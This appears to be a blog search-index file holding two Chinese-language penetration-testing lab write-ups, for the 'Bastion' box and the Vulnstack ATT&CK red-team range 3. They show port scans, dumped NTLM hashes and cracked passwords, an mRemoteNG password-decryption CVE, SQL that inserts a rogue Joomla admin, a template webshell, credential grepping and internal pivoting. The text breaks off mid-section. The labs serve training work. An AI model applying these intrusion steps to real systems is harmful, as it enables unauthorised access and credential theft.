<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>W Easy-Bastion</title>
      <link href="/2024/10/06/W%20Easy-Bastion/"/>
      <url>/2024/10/06/W%20Easy-Bastion/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE  SERVICE      VERSION22/tcp    open   ssh          OpenSSH for_Windows_7.9 (protocol 2.0)| ssh-hostkey:|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)25/tcp    closed smtp110/tcp   closed pop3135/tcp   open   msrpc        Microsoft Windows RPC139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open   msrpc        Microsoft Windows RPC49665/tcp open   msrpc        Microsoft Windows RPC49666/tcp open   msrpc        Microsoft Windows RPC49667/tcp open   msrpc        Microsoft Windows RPC49668/tcp open   msrpc        Microsoft Windows RPC49669/tcp open   msrpc        Microsoft Windows RPC49670/tcp open   msrpc        Microsoft Windows RPC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="入侵-驻足"><a href="#入侵-驻足" class="headerlink" title="入侵 &amp; 驻足"></a>入侵 &amp; 驻足</h1><h2 id="smb-guest登录策略"><a href="#smb-guest登录策略" class="headerlink" title="smb guest登录策略"></a>smb guest登录策略</h2><p>对smb进行枚举<br><img src="/Rxi134_FILE/f6c2c7ba974326656f4877f7574b70c3_MD5.jpeg"><br>开启了guest登录策略，随机的用户名都会映射为guest用户</p><p><img src="/Rxi134_FILE/2c5baf067163bd972aa8780521eb8dad_MD5.jpeg"></p><h2 id="发现备份文件夹"><a href="#发现备份文件夹" class="headerlink" title="发现备份文件夹"></a>发现备份文件夹</h2><p>其中有个 note.txt 和 文件夹 WindowsImageBackup<br><img src="/Rxi134_FILE/41f43da27c87c35f9254b53c56ebc304_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.系统管理员：请不要将整个备份文件传输到本地，到子公司的 VPN 太慢了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="挂载磁盘"><a href="#挂载磁盘" class="headerlink" title="挂载磁盘"></a>挂载磁盘</h2><p>有两个vhd文件，分别进行挂载，只有一个盘里有东西<br><img src="/Rxi134_FILE/51cdaecb2c4cf1eead38021f71ae2d1c_MD5.jpeg"><br><img src="/Rxi134_FILE/f30f207fd53fb255d38e1a450334eb2d_MD5.jpeg"></p><h2 id="转储-SAM-SYSTEM"><a href="#转储-SAM-SYSTEM" class="headerlink" title="转储 SAM &amp; SYSTEM"></a>转储 SAM &amp; SYSTEM</h2><p>先看看能不能把默认账密搞到手<br><img src="/Rxi134_FILE/07dff079d282657e71ddd77fde55300e_MD5.jpeg"><br>利用mimikatz解密<br><img src="/Rxi134_FILE/3344986976eb459e67d751a265ab16f7_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">RID  : 000001f4 (500)User : Administrator  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0RID  : 000001f5 (501)User : GuestRID  : 000003e8 (1000)User : L4mpje  Hash NTLM: 26112010952d963c8dc4217daec986d9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到彩虹表查下<br><img src="/Rxi134_FILE/aabcee57e6af159e13b02acbe1c9f2e8_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">L4mpje:bureaulampje<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="openssh连接"><a href="#openssh连接" class="headerlink" title="openssh连接"></a>openssh连接</h2><p>ssh直接上去了<br><img src="/Rxi134_FILE/c2241c837a4a93e6f105d90a9319ad4b_MD5.jpeg"></p><h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="上传winpeas"><a href="#上传winpeas" class="headerlink" title="上传winpeas"></a>上传winpeas</h2><p>上传 winpeas 先进行一波收集，常见的攻击向量都没什么可用的</p><p>还有一个攻击向量是受攻击程序，但是用户权限太低了，连列出计算机安装的应用程序都做不到<br><img src="/Rxi134_FILE/11cb658d90ab733ab4215a72b3211f3a_MD5.jpeg"><br>我只能手动去翻翻Program Files了<br><img src="/Rxi134_FILE/2557f5b7e5b8155f61d1f8ff2bc58439_MD5.jpeg"></p><h2 id="利用受攻击软件-mRemoteNG-CVE-2023-30367-获取管理员密码"><a href="#利用受攻击软件-mRemoteNG-CVE-2023-30367-获取管理员密码" class="headerlink" title="利用受攻击软件 mRemoteNG CVE-2023-30367 获取管理员密码"></a>利用受攻击软件 mRemoteNG CVE-2023-30367 获取管理员密码</h2><blockquote><p><strong>mRemoteNG</strong> 是一个开源、多协议的远程连接管理器，支持多种远程连接协议，如 RDP（远程桌面）、VNC、SSH、Telnet 等。它通过集中化的管理界面，帮助用户快速组织和访问多台服务器或设备。</p></blockquote><p>下载下来看看版本，1.76.11<br><img src="/Rxi134_FILE/c5f4bbc6cfc831119faf18febec1633a_MD5.jpeg"></p><p><img src="/Rxi134_FILE/1bf55d33d97ed8c04969608258385bf8_MD5.jpeg"><br>请注意，配置密码加密和连接文件加密是不同的设置。配置密码加密仅用于加密配置文件中的密码，而连接文件加密用于加密整个配置文件本身。</p><p>此漏洞通过从内存中转储已解密的配置来绕过连接文件加密。但是不包含配置文件加密的密码（默认密钥 <code>mR3m</code> ），如果已设置自定义配置密码加密密钥&#x2F;密码，攻击者仍必须猜测自定义密钥。（参见 <a href="https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/tree/main?tab=readme-ov-file#mremoteng_decryptpy">mremoteng-decrypt.py 部分</a>）</p><p>确定加密的配置文件位置</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">l4mpje@BASTION C:\Users\L4mpje>dir c:\ /s /b | find "confCons.xml"                  c:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xmlc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402277353.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402339071.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1402379227.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403070644.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403100488.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403220026.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403261268.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403272831.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403433299.backupc:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.20190222-1403486580.backup   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/192185e805cf2007aa0070c4db5760ec_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用脚本：<a href="https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper/tree/main?tab=readme-ov-file">S1lkys&#x2F;CVE-2023-30367-mRemoteNG-password-dumper: Original PoC for CVE-2023-30367 (github.com)</a></p><p>解密如下<br><img src="/Rxi134_FILE/3dbfa1187e51d551f8073a269d52f1b0_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator:thXLHM96BeKL0ER2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/62e546d0998c7bbe4efeed3aff61a5b5_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 进攻性渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-3</title>
      <link href="/2024/10/05/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-3/"/>
      <url>/2024/10/05/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-3/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">漏洞详情 (qiyuanxuetang.net)</a></p></blockquote><p>打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。</p><h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><p>VMnet2和VMnet3配置如图所示<br><img src="/Rxi134_FILE/986298e29ccae5da90aa4f70ef4a1f12_MD5.jpeg"></p><p>然后启动所有虚拟机，并设置centos一个NAT网卡，同时重启网络服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> network restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>黑盒模式，没有账密</p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>先扫端口</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)| ssh-hostkey: |   1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA)|_  2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA)80/tcp   open  http    nginx 1.9.4|_http-title: Home|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA|_http-generator: Joomla! - Open Source Content Management| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: nginx/1.9.4| http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1| mysql-info: |   Protocol: 10|   Version: 5.7.27-0ubuntu0.16.04.1|   Thread ID: 13|   Capabilities flags: 63487|   Some Capabilities: IgnoreSpaceBeforeParenthesis, FoundRows, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolNew, Speaks41ProtocolOld, LongPassword, SupportsTransactions, ODBCClient, SupportsCompression, Support41Auth, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults|   Status: Autocommit|   Salt: \x11L>y\x0F&#123;>JK\x1AE3i \x1F=U6\x01\x04|_  Auth Plugin Name: mysql_native_password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>22端口：ssh<br>80端口：这里扫出来一个 robots.txt，里面是joomla cms的目录<br>3306端口：mysql 5.7.27</p><p>goby上去打些常用poc，直接给我扫出个弱口令，<code>root:123</code><br><img src="/Rxi134_FILE/78677d2143ef5d9c9634c796800f071e_MD5.jpeg"><br>先不急着利用，再搜集些信息</p><p>Joomla CMS<br><img src="/Rxi134_FILE/8f51a446c2a6450bf98a94f5984556d0_MD5.jpeg"></p><p>Joomlascan扫出来一些目录信息，Joomla 3.9.12<br><img src="/Rxi134_FILE/2008ef20127c13f867bb5f0c6854e5d0_MD5.jpeg"></p><p>这里泄露了joomla的配置文件，其中包含了数据库密码和网站绝对路径<br><img src="/Rxi134_FILE/9511a58529b2dc8583373356f598d030_MD5.jpeg"><br><img src="/Rxi134_FILE/7d49600c2c611bd434de1e727f152f2d_MD5.jpeg"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token variable">$dbtype</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'mysqli'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'testuser'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cvcvgjASD!@'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'joomla'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$dbprefix</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'am2zu_'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$live_site</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'gXN9Wbpk7ef3A4Ys'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>远程连接数据库，先找找有没有可用的信息，在两个表里存放了账密信息<br><img src="/Rxi134_FILE/b374998d36dab3a65144481d70d63367_MD5.jpeg"></p><p>我们这个用户权限很低，几乎无权进行任何写操作<br><img src="/Rxi134_FILE/6059b9fba6afe41ea3719b42fb46155c_MD5.jpeg"></p><h1 id="尝试数据库写马"><a href="#尝试数据库写马" class="headerlink" title="尝试数据库写马"></a>尝试数据库写马</h1><p>回到root用户，现在有网站的绝对路径，into oufile是没有限制，但是网站目录无权写入<br><img src="/Rxi134_FILE/92032314d1c8e5806e2c200151dd34f5_MD5.jpeg"></p><h1 id="尝试破解哈希"><a href="#尝试破解哈希" class="headerlink" title="尝试破解哈希"></a>尝试破解哈希</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">891Super Useradministratortest@test.com$2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2184Super Useradmintest@test.com$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>becrypt，hashcat没爆出来</p><h1 id="尝试添加新用户"><a href="#尝试添加新用户" class="headerlink" title="尝试添加新用户"></a>尝试添加新用户</h1><p><img src="/Rxi134_FILE/ae2610f8d43a4f32cafab473d5459e67_MD5.jpeg"><br>添加了一个用户，但还是登陆失败</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_users<span class="token variable">`</span></span>   <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>name<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>password<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>params<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>registerDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastvisitDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastResetTime<span class="token variable">`</span></span><span class="token punctuation">)</span>VALUES <span class="token punctuation">(</span><span class="token string">'Administrator2'</span>, <span class="token string">'admin2'</span>,    <span class="token string">'d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199'</span>, <span class="token string">''</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_user_usergroup_map<span class="token variable">`</span></span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>user_id<span class="token variable">`</span></span>,<span class="token variable"><span class="token variable">`</span>group_id<span class="token variable">`</span></span><span class="token punctuation">)</span>VALUES <span class="token punctuation">(</span>LAST_INSERT_ID<span class="token punctuation">(</span><span class="token punctuation">)</span>,<span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把管理员密码改掉就能登上了<br><img src="/Rxi134_FILE/146fb934f6679b623540b3006b2732fe_MD5.jpeg"><br><img src="/Rxi134_FILE/d4a5ab449597882bd67504629888279e_MD5.jpeg"></p><h1 id="Joomla-后台主题写马"><a href="#Joomla-后台主题写马" class="headerlink" title="Joomla!后台主题写马"></a>Joomla!后台主题写马</h1><p><img src="/Rxi134_FILE/6740098f1b6cc83b4bdd8c52d1b89792_MD5.jpeg"></p><p>任意点击一个主题，修改模板，访问&#x2F;templates&#x2F;beez3&#x2F;error.php即可，上的蚁剑</p><h2 id="disabled-function绕过"><a href="#disabled-function绕过" class="headerlink" title="disabled_function绕过"></a>disabled_function绕过</h2><p>收到 disabled_function 的限制<br><img src="/Rxi134_FILE/9c6a0ef4e19e9a0e0d430910129ee794_MD5.jpeg"></p><p>蚁剑有专门的插件，PHP7_GC_UAF可以成功绕过<br><img src="/Rxi134_FILE/3fc2dc2771fd7290096d71b82198b1ea_MD5.jpeg"></p><h1 id="权限提升到用户"><a href="#权限提升到用户" class="headerlink" title="权限提升到用户"></a>权限提升到用户</h1><p>开了22端口，看看有没有id_rsa<br><img src="/Rxi134_FILE/92f8b5eead72a9227bdd38034f59d422_MD5.jpeg"><br>没有.ssh文件夹，看来不行</p><p>上传linpeas进行一波收集，也没有什么可用的攻击面，倒是内核版本很低，可以提权<br><img src="/Rxi134_FILE/adbec4c2b344b7caa56b72867a62b2b0_MD5.jpeg"></p><p>模糊匹配一些敏感词，比如password、passwd、pass、username</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-E</span> <span class="token string">'passwd*|password*'</span> /var/www/html /home/yy /tmp  <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/cd51a330c12b4b26c72a9d13cff7ffe2_MD5.jpeg"></p><p>在&#x2F;tmp下找到可疑账密<br><img src="/Rxi134_FILE/8f2484e2010dab9fb80f512537793802_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">adduser wwwuserpasswd wwwuser_123Aqx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ssh<br><img src="/Rxi134_FILE/734b925dfa65474c2bafd496dd89bc56_MD5.jpeg"></p><p>再上linpeas进行一波收集，还是没什么可用的</p><h1 id="93网段探测"><a href="#93网段探测" class="headerlink" title="93网段探测"></a>93网段探测</h1><p>存在一个 93 网段<br><img src="/Rxi134_FILE/40dfbfc534c50942d6723dda6a74e4ce_MD5.jpeg"></p><p>不好上线CS，这里选择上线msf<br><img src="/Rxi134_FILE/eab5ad07341f9718763f4f9d39ed346d_MD5.jpeg"></p><h2 id="fscan内网大保健"><a href="#fscan内网大保健" class="headerlink" title="fscan内网大保健"></a>fscan内网大保健</h2><p>上传fscan</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start ping(icmp) Target 192.168.93.10   is alive(icmp) Target 192.168.93.20   is alive(icmp) Target 192.168.93.30   is alive(icmp) Target 192.168.93.100  is alive(icmp) Target 192.168.93.120  is alive[*] Icmp alive hosts len is: 5192.168.93.20:80 open192.168.93.30:135 open192.168.93.10:135 open192.168.93.20:135 open192.168.93.120:22 open192.168.93.100:80 open192.168.93.100:22 open192.168.93.30:445 open192.168.93.30:139 open192.168.93.100:3306 open192.168.93.20:1433 open192.168.93.120:3306 open192.168.93.10:139 open192.168.93.20:445 open192.168.93.20:139 open192.168.93.10:445 open192.168.93.120:80 open192.168.93.10:88 open[*] alive ports len is: 18start vulscan[*] NetInfo [*]192.168.93.30   [->]win7   [->]192.168.93.30[*] NetInfo [*]192.168.93.10   [->]WIN-8GA56TNV3MV   [->]192.168.93.10[*] NetBios 192.168.93.10   [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server 2012 R2 Datacenter 9600[*] OsInfo 192.168.93.10(Windows Server 2012 R2 Datacenter 9600)[*] NetBios 192.168.93.20   win2008.test.org                    Windows Server (R) 2008 Datacenter 6003 Service Pack 2[*] NetInfo [*]192.168.93.20   [->]win2008   [->]192.168.93.20[*] OsInfo 192.168.93.30(Windows 7 Professional 7601 Service Pack 1)[*] WebTitle http://192.168.93.20      code:404 len:315    title:Not Found[*] OsInfo 192.168.93.20(Windows Server (R) 2008 Datacenter 6003 Service Pack 2)[+] mysql 192.168.93.100:3306:root 123[+] mysql 192.168.93.120:3306:root 123[*] WebTitle http://192.168.93.100     code:200 len:16020  title:Home[*] WebTitle http://192.168.93.120     code:200 len:16020  title:Home已完成 16/18 [-] ssh 192.168.93.100:22 root 12345678 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.100:22 root Aa12345. ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.100:22 admin admin1 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 16/18 [-] ssh 192.168.93.120:22 admin a11111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 已完成 18/18<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先整理一下，93段有哪些机子</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">192.168.93.10 Windows Server 2012 R2192.168.93.20 win2008192.168.93.30 win7192.168.93.100 centos 我们所在的位置192.168.93.120 linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fscan扫出一个 mysql 弱口令 <code>root:123</code>，是120那台机子</p><h1 id="ew搭建socks5代理"><a href="#ew搭建socks5代理" class="headerlink" title="ew搭建socks5代理"></a>ew搭建socks5代理</h1><p><img src="/Rxi134_FILE/014ea430e8b41de1c5787eb35353ce0d_MD5.jpeg"></p><p>再利用proxfiler实现全局代理<br><img src="/Rxi134_FILE/8570d52d14d969703d275a881a58b406_MD5.jpeg"></p><h1 id="120备份服务器"><a href="#120备份服务器" class="headerlink" title="120备份服务器"></a>120备份服务器</h1><p>navicat连接上数据库<br><img src="/Rxi134_FILE/8c6124efb27613eb95e74468e7f28b90_MD5.jpeg"><br>数据库完全一样，这有可能是个备份服务器<br><img src="/Rxi134_FILE/d80b26776f729e5e972fb3da354c3d06_MD5.jpeg"></p><p>尝试用centos的密码ssh上去，被拒绝，照着原来的写马就行，这里就不再重复了</p><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="尝试永恒之蓝"><a href="#尝试永恒之蓝" class="headerlink" title="尝试永恒之蓝"></a>尝试永恒之蓝</h2><p>这三个windows机器都开了445，给msf加一段session路由，扫这三个windows机器<br><img src="/Rxi134_FILE/99886acb32e07f00ecc70b94fe1ed86f_MD5.jpeg"><br><img src="/Rxi134_FILE/0cafa142dcd00f1f7fd4d90e1f4e8f14_MD5.jpeg"><br>啥都没有</p><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><ul><li><p>10机器 - Windows Server 2012 R2</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE    VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2553/tcp    open  tcpwrapped88/tcp    open  tcpwrapped110/tcp   open  tcpwrapped135/tcp   open  tcpwrapped139/tcp   open  tcpwrapped389/tcp   open  tcpwrapped445/tcp   open  tcpwrapped Windows Server 2012 R2 Datacenter 9600 tcpwrapped464/tcp   open  tcpwrapped593/tcp   open  tcpwrapped636/tcp   open  tcpwrapped3268/tcp  open  tcpwrapped3269/tcp  open  tcpwrapped49155/tcp open  tcpwrapped49157/tcp open  tcpwrapped49158/tcp open  tcpwrapped49159/tcp open  tcpwrapped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>20机器 - win2008</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE      VERSION25/tcp    open  tcpwrapped|_smtp-commands: Couldn't establish connection on port 2580/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found110/tcp   open  tcpwrapped135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds Windows Server (R) 2008 Datacenter 6003 Service Pack 2 microsoft-ds (workgroup: TEST)1433/tcp  open  ms-sql-s     Microsoft SQL Server 2008 10.00.1600.00; RTM| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback| Issuer: commonName=SSL_Self_Signed_Fallback| Public Key type: rsa| Public Key bits: 1024| Signature Algorithm: sha1WithRSAEncryption| Not valid before: 2019-12-15T05:29:23| Not valid after:  2049-12-15T05:29:23| MD5:   53e9:ab09:d053:84ac:5740:c08b:c93a:e843|_SHA-1: a6a9:c4bd:6d50:a57c:0bec:ad38:5766:7032:0965:33e6|_ssl-date: 2024-10-04T11:53:59+00:00; 0s from scanner time.| ms-sql-ntlm-info:|   192.168.93.20\MSSQLSERVER:|     Target_Name: TEST|     NetBIOS_Domain_Name: TEST|     NetBIOS_Computer_Name: WIN2008|     DNS_Domain_Name: test.org|     DNS_Computer_Name: win2008.test.org|     DNS_Tree_Name: test.org|_    Product_Version: 6.0.6003| ms-sql-info:|   192.168.93.20\MSSQLSERVER:|     Instance name: MSSQLSERVER|     Version:|       name: Microsoft SQL Server 2008 RTM|       number: 10.00.1600.00|       Product: Microsoft SQL Server 2008|       Service pack level: RTM|       Post-SP patches applied: false|     TCP port: 1433|_    Clustered: false2383/tcp  open  ms-olap4?49152/tcp open  msrpc        Microsoft Windows RPC49153/tcp open  msrpc        Microsoft Windows RPC49154/tcp open  msrpc        Microsoft Windows RPC49155/tcp open  msrpc        Microsoft Windows RPC49156/tcp open  msrpc        Microsoft Windows RPC49158/tcp open  msrpc        Microsoft Windows RPC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>30机器 - win7</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE25/tcp    open  smtp110/tcp   open  pop3135/tcp   open  msrpc139/tcp   open  netbios-ssn445/tcp   open  microsoft-ds49152/tcp open  unknown49153/tcp open  unknown49154/tcp open  unknown49155/tcp open  unknown49163/tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>存在域 test.org</p><p>这里我还试着看看smb有没有匿名登录，不过都不行</p><h2 id="smb弱口令爆破"><a href="#smb弱口令爆破" class="headerlink" title="smb弱口令爆破"></a>smb弱口令爆破</h2><p>看wp说是win7和win2008的SMB是弱口令<code>administrator:123qwe!ASD</code></p><p>我就懒得爆了，直接用</p><h2 id="psexec-拿下win7、win2008"><a href="#psexec-拿下win7、win2008" class="headerlink" title="psexec 拿下win7、win2008"></a>psexec 拿下win7、win2008</h2><pre 